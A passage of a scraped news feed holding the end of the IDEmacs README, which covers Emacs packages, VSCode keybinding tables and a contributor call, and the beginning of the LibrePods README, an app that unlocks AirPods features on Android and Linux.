<li><a href="https://github.com/ema2159/centaur-tabs/" rel="nofollow">Centaur Tabs</a> for the tab bar</li>
<li><code>breadcrumb</code> to show file paths as breadcrumbs</li>
<li><code>idle-highlight-mode</code> to automatically highlight occurrences of the symbol at point</li>
<li>Emulation of most keybindings listed in the "General", "Basic Editing", "Rich Languages Editing", and "Multi-cursor and selection" sections of the <a href="https://code.visualstudio.com/shortcuts/keyboard-shortcuts-linux.pdf" rel="nofollow">VSCode keyboard shortcuts cheatsheet</a>.</li>
<li>All editing packages required for emulation, including <code>whole-line-or-region</code>, <code>expand-region</code>, <code>multiple-cursors</code>, and <code>smartparens</code></li>
<li><code>vc</code> and <code>magit</code> for version control</li>
<li><code>diff-hl</code> and <code>blamer</code> to show in-buffer version control information</li>
<li>A comprehensive collection of completion packages - <a href="https://github.com/minad/vertico" rel="nofollow">Vertico</a>, <code>orderless</code>, <a href="https://github.com/minad/consult/" rel="nofollow">Consult</a>, <code>marginalia</code>, and <code>company</code>.</li>
<li>Lisp editing packages - <code>sly</code>, <code>geiser</code>, and <code>adjust-parens</code> (similar to Parinfer)</li>
<li><code>eat</code> for terminals</li>
<li>Sensible Emacs defaults, and other goodies - <code>org-superstar</code>, <code>pdf-tools</code>, <code>undo-tree</code>, <code>helpful</code>, <code>rainbow-mode</code>, ‚Ä¶</li>
</ol>
<p><code>use-package</code> is used to keep the code organized.</p>
<div id="user-content-outline-container-vscode-keybinding-coverage">
<h4 id="user-content-vscode-keybinding-coverage">
Keybinding coverage
</h4>
<div id="user-content-outline-text-vscode-keybinding-coverage">
<p>An empty command cell means we haven't bound anything to these keys yet.</p>
<div id="user-content-outline-container-vscode-keybindings-general">
<h5 id="user-content-vscode-keybindings-general">
General
</h5>
<div id="user-content-outline-text-vscode-keybindings-general">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>C-S-p</code></td>
<td>Show Command Palette</td>
<td><code>execute-extended-command</code></td>
<td>VSCode also binds F1 to this, but we currently leave that to the Emacs help prefixes.</td>
</tr>
<tr>
<td><code>C-p</code></td>
<td>Quick Open, Go to File</td>
<td><code>consult-locate</code></td>
<td>FIXME - behaviour differs from VSCode. Without a search term, VSCode suggests currently- and recently-opened files. Once a search term is entered, it searches for currently- and recently-opened files and the files in the currently opened project.</td>
</tr>
<tr>
<td><code>C-S-n</code></td>
<td>New window/instance</td>
<td><code>make-frame</code></td>
<td></td>
</tr>
<tr>
<td><code>C-w</code></td>
<td>Close window/instance</td>
<td><code>idemacs-kill-buffer-noprompt</code></td>
<td></td>
</tr>
<tr>
<td><code>C-,</code></td>
<td>User Settings</td>
<td><code>customize</code></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-s</code></td>
<td>Keyboard Shortcuts</td>
<td></td>
<td>We need to make an interface for this.</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-display">
<h5 id="user-content-vscode-keybindings-display">
Keys not mentioned in the VSCode keyboard shortcuts PDF
</h5>
<div id="user-content-outline-text-vscode-keybindings-display">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;escape&gt;</code></td>
<td><code>idemacs-escape</code></td>
<td>Tries to provide VSCode behaviour while also acting as <code>C-g</code></td>
</tr>
<tr>
<td><code>C-a</code></td>
<td><code>idemacs-select-all</code></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-o</code></td>
<td><code>treemacs-select-directory</code></td>
<td>FIXME - behaviour differs from VSCode. This should not just open a directory in Treemacs but also load the corresponding <code>desktop</code> file for it.</td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-basic-editing">
<h5 id="user-content-vscode-keybindings-basic-editing">
Basic editing
</h5>
<div id="user-content-outline-text-vscode-keybindings-basic-editing">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>C-x</code></td>
<td>Cut line (empty selection)</td>
<td><code>cua-cut-handler</code></td>
<td>empty selection behaviour is TODO</td>
</tr>
<tr>
<td><code>C-c</code></td>
<td>Copy line (empty selection)</td>
<td><code>cua-copy-handler</code></td>
<td>empty selection behaviour is TODO</td>
</tr>
<tr>
<td><code>M-&lt;up&gt;</code> / <code>M-&lt;down&gt;</code></td>
<td>Move line up/down</td>
<td><code>drag-stuff-up</code> / <code>drag-stuff-down</code></td>
<td></td>
</tr>
<tr>
<td><code>C-S-k</code></td>
<td>Delete line</td>
<td><code>whole-line-or-region-kill-region</code></td>
<td></td>
</tr>
<tr>
<td><code>C-RET</code> / <code>C-S-RET</code></td>
<td>Insert line below/above</td>
<td><code>idemacs-open-line</code> / <code>idemacs-open-line-above</code></td>
<td></td>
</tr>
<tr>
<td><code>C-S-\</code></td>
<td>Jump to matching bracket</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-]</code> / <code>C-[</code></td>
<td>Indent/Outdent line</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>&lt;home&gt;</code> / <code>&lt;end&gt;</code></td>
<td>Go to beginning/end of line</td>
<td><code>move-beginning-of-line</code> / <code>move-end-of-line</code></td>
<td>vanilla Emacs defaults</td>
</tr>
<tr>
<td><code>C-&lt;home&gt;</code> / <code>C-&lt;end&gt;</code></td>
<td>Go te beginning/end of file</td>
<td><code>beginning-of-buffer</code> / <code>end-of-buffer</code></td>
<td>vanilla Emacs defaults</td>
</tr>
<tr>
<td><code>C-&lt;up&gt;</code> / <code>C-&lt;down&gt;</code></td>
<td>Scroll line up/down</td>
<td><code>scroll-down-line</code> / <code>scroll-up-line</code></td>
<td></td>
</tr>
<tr>
<td><code>M-&lt;prior&gt;</code> (Page Up) / <code>M-&lt;next&gt;</code> (Page Down)</td>
<td>Scroll page up/down</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-[</code> / <code>C-S-]</code></td>
<td>Fold/unfold region</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-[</code> / <code>C-k C-]</code></td>
<td>Fold/unfold all subregions</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-0</code> / <code>C-k C-j</code></td>
<td>Fold/unfold all regions</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-c</code></td>
<td>Add line comment</td>
<td><code>idemacs-comment-line</code></td>
<td>In VSCode, subsequent presses add additional comment characters to the start of the line, whereas IDEmacs-VSCode just toggles the comment.</td>
</tr>
<tr>
<td><code>C-k C-u</code></td>
<td>Remove line comment</td>
<td><code>idemacs-comment-line</code></td>
<td>In VSCode, subsequent presses remove additional comment characters from the start of the line, whereas IDEmacs-VSCode just toggles the comment.</td>
</tr>
<tr>
<td><code>C-/</code></td>
<td>Toggle line comment</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-a</code></td>
<td>Toggle block comment</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>M-z</code></td>
<td>Toggle word wrap</td>
<td><code>toggle-truncate-lines</code></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-rich-language-editing">
<h5 id="user-content-vscode-keybindings-rich-language-editing">
Rich languages editing
</h5>
<div id="user-content-outline-text-vscode-keybindings-rich-language-editing">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>C-SPC</code>, <code>C-i</code></td>
<td>Trigger suggestion</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-SPC</code></td>
<td>Trigger parameter hints</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-i</code></td>
<td>Format document</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-f</code></td>
<td>Format selection</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>&lt;f12&gt;</code></td>
<td>Go to definition</td>
<td><code>xref-find-definitions</code></td>
<td></td>
</tr>
<tr>
<td><code>C-S-&lt;f10&gt;</code></td>
<td>Peek definition</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k &lt;f12&gt;</code></td>
<td>Open definition to the side</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-.</code></td>
<td>Quick fix</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>S-&lt;f12&gt;</code></td>
<td>Show references</td>
<td><code>xref-find-references</code></td>
<td></td>
</tr>
<tr>
<td><code>&lt;f2&gt;</code></td>
<td>Rename symbol</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-x</code></td>
<td>Trim trailing whitespace</td>
<td><code>delete-trailing-whitespace</code></td>
<td></td>
</tr>
<tr>
<td><code>C-k m</code></td>
<td>Change file language</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-multicursor-selection">
<h5 id="user-content-vscode-keybindings-multicursor-selection">
Multi-cursor and selection
</h5>
<div id="user-content-outline-text-vscode-keybindings-multicursor-selection">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>M-&lt;down-mouse-1&gt;</code></td>
<td>Insert cursor</td>
<td><code>mc/toggle-cursor-on-click</code></td>
<td></td>
</tr>
<tr>
<td><code>M-S-&lt;up&gt;</code> / <code>M-S-&lt;down&gt;</code></td>
<td>Insert cursor above/below</td>
<td><code>mc/mark-previous-lines</code> / <code>mc/mark-next-lines</code></td>
<td></td>
</tr>
<tr>
<td><code>C-u</code></td>
<td>Undo last cursor operation</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>M-S-i</code></td>
<td>Insert cursor at end of each line selected</td>
<td><code>mc/edit-ends-of-lines</code></td>
<td></td>
</tr>
<tr>
<td><code>C-l</code></td>
<td>Select current line</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-l</code></td>
<td>Select all occurrences of current selection</td>
<td><code>mc/mark-all-like-this</code></td>
<td></td>
</tr>
<tr>
<td><code>C-&lt;f2&gt;</code></td>
<td>Select all occurrences of current word</td>
<td><code>mc/mark-all-words-like-this</code></td>
<td></td>
</tr>
<tr>
<td><code>M-S-&lt;right&gt;</code></td>
<td>Expand selection</td>
<td><code>er/expand-region</code></td>
<td></td>
</tr>
<tr>
<td><code>M-S-&lt;left&gt;</code></td>
<td>Shrink selection</td>
<td><code>er/contract-region</code></td>
<td></td>
</tr>
<tr>
<td><code>M-S-&lt;down-mouse-1&gt;</code></td>
<td>Column (box) selection</td>
<td><code>idemacs-mouse-drag-rectangle</code></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-display">
<h5 id="user-content-vscode-keybindings-display">
Display
</h5>
<div id="user-content-outline-text-vscode-keybindings-display">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>&lt;f11&gt;</code></td>
<td>Toggle full screen</td>
<td><code>toggle-frame-fullscreen</code></td>
<td>vanilla Emacs defaults</td>
</tr>
<tr>
<td><code>M-S-0</code></td>
<td>Toggle editor layout (horizontal/vertical)</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-\=</code> / <code>C--</code></td>
<td>Zoom in/out</td>
<td><code>text-scale-increase</code> / <code>text-scale-decrease</code></td>
<td></td>
</tr>
<tr>
<td><code>C-b</code></td>
<td>Toggle sidebar visibility</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-e</code></td>
<td>Show Explorer/ Toggle focus</td>
<td><code>idemacs-treemacs</code></td>
<td></td>
</tr>
<tr>
<td><code>C-S-f</code></td>
<td>Show Search</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-g</code></td>
<td>Show Source Control</td>
<td><code>magit-status</code></td>
<td></td>
</tr>
<tr>
<td><code>C-S-d</code></td>
<td>Show Debug</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-x</code></td>
<td>Show Extensions</td>
<td><code>list-packages</code></td>
<td>We need to write a better interface. Elpaca may be an option.</td>
</tr>
<tr>
<td><code>C-S-h</code></td>
<td>Replace in files</td>
<td><code>isearch-query-replace</code></td>
<td>We need an incremental, multi-file replacement UI.</td>
</tr>
<tr>
<td><code>C-S-j</code></td>
<td>Toggle Search details</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-c</code></td>
<td>Open new command prompt/terminal</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-h</code></td>
<td>Show output panel</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-v</code></td>
<td>Open Markdown preview</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k v</code></td>
<td>Open Markdown preview to the side</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k z</code></td>
<td>Zen Mode (Esc Esc to exit)</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-search-replace">
<h5 id="user-content-vscode-keybindings-search-replace">
Search and replace
</h5>
<div id="user-content-outline-text-vscode-keybindings-search-replace">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>C-t</code></td>
<td>Show all symbols</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-g</code></td>
<td>Go to line</td>
<td><code>consult-line</code></td>
<td></td>
</tr>
<tr>
<td><code>C-p</code></td>
<td>Go to file</td>
<td><code>consult-locate</code></td>
<td>FIXME - behaviour differs from VSCode</td>
</tr>
<tr>
<td><code>C-S-o</code></td>
<td>Go to symbol</td>
<td><code>consult-imenu-multi</code></td>
<td>FIXME - behaviour differs from VSCode</td>
</tr>
<tr>
<td><code>C-S-m</code></td>
<td>Show problems panel</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>&lt;f8&gt;</code></td>
<td>Go to next error or warning</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>S-&lt;f8&gt;</code></td>
<td>Go to previous error or warning</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-&lt;tab&gt;</code></td>
<td>Navigate editor group history</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-M--</code></td>
<td>Go back</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S--</code></td>
<td>Go forward</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-m</code></td>
<td>Toggle Tab moves focus</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-editor-management">
<h5 id="user-content-vscode-keybindings-editor-management">
Editor management
</h5>
<div id="user-content-outline-text-vscode-keybindings-editor-management">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>C-w</code></td>
<td>Close editor</td>
<td><code>idemacs-kill-buffer-noprompt</code></td>
<td>FIXME - behaviour differs from VSCode</td>
</tr>
<tr>
<td><code>C-k f</code></td>
<td>Close folder</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-\</code></td>
<td>Split editor</td>
<td><code>split-window-right</code></td>
<td></td>
</tr>
<tr>
<td><code>C-1</code> / <code>C-2</code> / <code>C-3</code></td>
<td>Focus into 1st, 2nd, 3rd editor group</td>
<td><code>select-window-1</code>, <code>select-window-2</code>, <code>select-window-3</code></td>
<td>FIXME - behaviour differs from VSCode</td>
</tr>
<tr>
<td><code>C-k C-&lt;left&gt;</code></td>
<td>Focus into previous editor group</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-&lt;right&gt;</code></td>
<td>Focus into next editor group</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-&lt;prior&gt;</code></td>
<td>Move editor left</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-&lt;next&gt;</code></td>
<td>Move editor right</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k &lt;left&gt;</code></td>
<td>Move active editor group left/up</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k &lt;right&gt;</code></td>
<td>Move active editor group right/down</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
<div id="user-content-outline-container-vscode-keybindings-file-management">
<h5 id="user-content-vscode-keybindings-file-management">
File management
</h5>
<div id="user-content-outline-text-vscode-keybindings-file-management">
<table>
<thead>
<tr>
<th>Keybinding</th>
<th>VSCode description</th>
<th>IDEmacs-VSCode command</th>
<th>Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>C-n</code></td>
<td>New file</td>
<td><code>untitled-new-buffer</code></td>
<td></td>
</tr>
<tr>
<td><code>C-o</code></td>
<td>Open file</td>
<td><code>find-file</code></td>
<td></td>
</tr>
<tr>
<td><code>C-s</code></td>
<td>Save</td>
<td><code>save-buffer</code></td>
<td></td>
</tr>
<tr>
<td><code>C-S-s</code></td>
<td>Save As</td>
<td><code>write-buffer</code></td>
<td></td>
</tr>
<tr>
<td><code>C-w</code></td>
<td>Close</td>
<td><code>idemacs-kill-buffer-noprompt</code></td>
<td></td>
</tr>
<tr>
<td><code>C-k C-w</code></td>
<td>Close all</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-t</code></td>
<td>Reopen closed editor</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k Enter</code></td>
<td>Keep preview mode editor open</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-&lt;tab&gt;</code></td>
<td>Open next</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-S-&lt;tab&gt;</code></td>
<td>Open previous</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k p</code></td>
<td>Copy path of active file</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k r</code></td>
<td>Reveal active file in Explorer</td>
<td></td>
<td></td>
</tr>
<tr>
<td><code>C-k o</code></td>
<td>Show active file in new window/instance</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
</div>
</div>
</div>
</div>
</div>
</div>
<div id="user-content-outline-container-contribute">
<h3 id="user-content-contribute">
Help needed!
</h3>
<div id="user-content-outline-text-contribute">
<p>Users -</p>
<ol>
<li>Use IDEmacs. Observe newbies as they use IDEmacs.</li>
<li>Provide your feedback in our <a href="https://xmpp.link/#emacs@conference.conversations.im?join" rel="nofollow">Jabber/XMPP room</a> or in the <a href="https://codeberg.org/idemacs/idemacs/issues" rel="nofollow">issues</a>.</li>
<li>Tell others about IDEmacs!</li>
</ol>
<p>Developers -</p>
<ol>
<li>Look at the major problems and to-do items in the <a href="https://codeberg.org/idemacs/idemacs/issues" rel="nofollow">issues</a> and the <a href="https://codeberg.org/IDEmacs/IDEmacs/src/branch/production/TODO.org" rel="nofollow">TODO.org</a></li>
<li>Search for "FIXME" in the source to find smaller problems</li>
<li>Make pull requests</li>
<li>Tell others about IDEmacs!</li>
</ol>
</div>
</div>
<div id="user-content-outline-container-headline-14">
<h3 id="user-content-headline-14">
Prior art
</h3>
<div id="user-content-outline-text-headline-14">
<ol>
<li>
<p><a href="https://github.com/seamus-brady/mousemacs" rel="nofollow">https://github.com/seamus-brady/mousemacs</a></p>
<p>
From the author -</p>
<blockquote>
<p>I created this abomination so I could learn Lisp without having to worry too much about learning Emacs. It was originally envisaged for me to use and then switch off as I learned Emacs. But I actually liked it better and now it is my main editor.</p>
<p>
Mousemacs works pretty much like Sublime Text or Visual Studio Code out of the box. But it has the full power of Emacs underneath. All I did was take all the most useful Emacs packages and wrap them in a mouse friendly distribution. It is not perfect and certainly not for everyone, but it might be useful for some. It comes with a simple plain theme but it is still Emacs.</p>
</blockquote>
</li>
</ol>
</div>
</div>
</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[AirPods libreated from Apple's ecosystem (1218 pts)]]></title>
            <link>https://github.com/kavishdevar/librepods</link>
            <guid>45941596</guid>
            <pubDate>Sun, 16 Nov 2025 00:01:25 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/kavishdevar/librepods">https://github.com/kavishdevar/librepods</a>, See on <a href="https://news.ycombinator.com/item?id=45941596">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/imgs/banner.png"><img src="https://github.com/kavishdevar/librepods/raw/main/imgs/banner.png" alt="LibrePods Banner"></a></p>
<p dir="auto"><a href="https://xdaforums.com/t/app-root-for-now-airpodslikenormal-unlock-apple-exclusive-airpods-features-on-android.4707585/" rel="nofollow"><img src="https://camo.githubusercontent.com/81effe4f42813693fb6d7b5250e14fcc978103f32180f73be64143f337657df6/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f5844415f466f72756d732d5468726561642d6f72616e6765" alt="XDA Thread" data-canonical-src="https://img.shields.io/badge/XDA_Forums-Thread-orange"></a>
<a href="https://github.com/kavishdevar/librepods/releases/latest"><img src="https://camo.githubusercontent.com/05c85bc1a93c02009c6cc3fbe120e3f3c970374ed308831227a071c550fa021c/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f762f72656c656173652f6b617669736864657661722f6c69627265706f6473" alt="GitHub release (latest by date)" data-canonical-src="https://img.shields.io/github/v/release/kavishdevar/librepods"></a>
<a href="https://github.com/kavishdevar/librepods/releases"><img src="https://camo.githubusercontent.com/975df716c4e688934f1bd3b29acf00206fbf760ffe5c64a23e3e2d4c190528a3/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f646f776e6c6f6164732f6b617669736864657661722f6c69627265706f64732f746f74616c" alt="GitHub all releases" data-canonical-src="https://img.shields.io/github/downloads/kavishdevar/librepods/total"></a>
<a href="https://github.com/kavishdevar/librepods/stargazers"><img src="https://camo.githubusercontent.com/c3df62029507ee0a8a1d883408914035263a0f2842f7ce94ed7706680b2699c5/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f73746172732f6b617669736864657661722f6c69627265706f6473" alt="GitHub stars" data-canonical-src="https://img.shields.io/github/stars/kavishdevar/librepods"></a>
<a href="https://github.com/kavishdevar/librepods/issues"><img src="https://camo.githubusercontent.com/b67b9b31848504a39c3856b98dfdf1b485e79d5cc485e3c10955537e1e90c784/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6973737565732f6b617669736864657661722f6c69627265706f6473" alt="GitHub issues" data-canonical-src="https://img.shields.io/github/issues/kavishdevar/librepods"></a>
<a href="https://github.com/kavishdevar/librepods/blob/main/LICENSE"><img src="https://camo.githubusercontent.com/8e0d5b7bd62658dc5e7817a4bb5decfc77c8bd94b90105c396e72b40742a17b5/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f6c6963656e73652f6b617669736864657661722f6c69627265706f6473" alt="GitHub license" data-canonical-src="https://img.shields.io/github/license/kavishdevar/librepods"></a>
<a href="https://github.com/kavishdevar/librepods/graphs/contributors"><img src="https://camo.githubusercontent.com/b4a565a4d231a7be4da7ecd7ece2cbd87dd9f2b2a8023bbd37fc986b3f0525b0/68747470733a2f2f696d672e736869656c64732e696f2f6769746875622f636f6e7472696275746f72732f6b617669736864657661722f6c69627265706f6473" alt="GitHub contributors" data-canonical-src="https://img.shields.io/github/contributors/kavishdevar/librepods"></a></p>
<p dir="auto"><h2 tabindex="-1" dir="auto">What is LibrePods?</h2><a id="user-content-what-is-librepods" aria-label="Permalink: What is LibrePods?" href="#what-is-librepods"></a></p>
<p dir="auto">LibrePods unlocks Apple's exclusive AirPods features on non-Apple devices. Get access to noise control modes, adaptive transparency, ear detection, hearing aid, customized transparency mode, battery status, and more - all the premium features you paid for but Apple locked to their ecosystem.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Device Compatibility</h2><a id="user-content-device-compatibility" aria-label="Permalink: Device Compatibility" href="#device-compatibility"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th>Status</th>
<th>Device</th>
<th>Features</th>
</tr>
</thead>
<tbody>
<tr>
<td>‚úÖ</td>
<td>AirPods Pro (2nd Gen)</td>
<td>Fully supported and tested</td>
</tr>
<tr>
<td>‚úÖ</td>
<td>AirPods Pro (3rd Gen)</td>
<td>Fully supported (except heartrate monitoring)</td>
</tr>
<tr>
<td><g-emoji alias="warning">‚ö†Ô∏è</g-emoji></td>
<td>Other AirPods models</td>
<td>Basic features (battery status, ear detection) should work</td>
</tr>
</tbody>
</table></markdown-accessiblity-table>
<p dir="auto">Most features should work with any AirPods. Currently, I've only got AirPods Pro 2 to test with.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Key Features</h2><a id="user-content-key-features" aria-label="Permalink: Key Features" href="#key-features"></a></p>
<ul dir="auto">
<li><strong>Noise Control Modes</strong>: Easily switch between noise control modes without having to reach out to your AirPods to long press</li>
<li><strong>Ear Detection</strong>: Controls your music automatically when you put your AirPods in or take them out, and switch to phone speaker when you take them out</li>
<li><strong>Battery Status</strong>: Accurate battery levels</li>
<li><strong>Head Gestures</strong>: Answer calls just by nodding your head</li>
<li><strong>Conversational Awareness</strong>: Volume automatically lowers when you speak</li>
<li><strong>Hearing Aid*</strong></li>
<li><strong>Customize Transparency Mode*</strong></li>
<li><strong>Multi-device connectivity*</strong> (upto 2 devices)</li>
<li><strong>Other customizations</strong>:
<ul dir="auto">
<li>Rename your AirPods</li>
<li>Customize long-press actions</li>
<li>Few accessibility features</li>
<li>And more!</li>
</ul>
</li>
</ul>
<p dir="auto">See our <a href="https://github.com/kavishdevar/librepods/issues/20" data-hovercard-type="issue" data-hovercard-url="/kavishdevar/librepods/issues/20/hovercard">pinned issue</a> for a complete feature list and roadmap.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Platform Support</h2><a id="user-content-platform-support" aria-label="Permalink: Platform Support" href="#platform-support"></a></p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Linux</h3><a id="user-content-linux" aria-label="Permalink: Linux" href="#linux"></a></p>
<p dir="auto">The Linux version runs as a system tray app. Connect your AirPods and enjoy:</p>
<ul dir="auto">
<li>Battery monitoring</li>
<li>Automatic Ear detection</li>
<li>Conversational Awareness</li>
<li>Switching Noise Control modes</li>
<li>Device renaming</li>
</ul>
<div dir="auto"><p dir="auto">Note</p><p dir="auto">Work in progress, but core functionality is stable and usable.</p>
</div>
<p dir="auto">For installation and detailed info, see the <a href="https://github.com/kavishdevar/librepods/blob/main/linux/README.md">Linux README</a>.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Android</h3><a id="user-content-android" aria-label="Permalink: Android" href="#android"></a></p>
<p dir="auto"><h4 tabindex="-1" dir="auto">Screenshots</h4><a id="user-content-screenshots" aria-label="Permalink: Screenshots" href="#screenshots"></a></p>
<markdown-accessiblity-table><table>
<thead>
<tr>
<th></th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/settings-1.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/settings-1.png" alt="Settings 1"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/settings-2.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/settings-2.png" alt="Settings 2"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/debug.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/debug.png" alt="Debug Screen"></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/notification-and-qs.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/notification-and-qs.png" alt="Battery Notification and QS Tile for NC Mode"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/popup.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/popup.png" alt="Popup"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/head-tracking-and-gestures.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/head-tracking-and-gestures.png" alt="Head Tracking and Gestures"></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/long-press.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/long-press.png" alt="Long Press Configuration"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/widget.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/widget.png" alt="Widget"></a></td>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/customizations-1.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/customizations-1.png" alt="Customizations 1"></a></td>
</tr>
<tr>
<td><a target="_blank" rel="noopener noreferrer" href="https://github.com/kavishdevar/librepods/blob/main/android/imgs/customizations-2.png"><img src="https://github.com/kavishdevar/librepods/raw/main/android/imgs/customizations-2.png" alt="Customizations 2"></a></td>
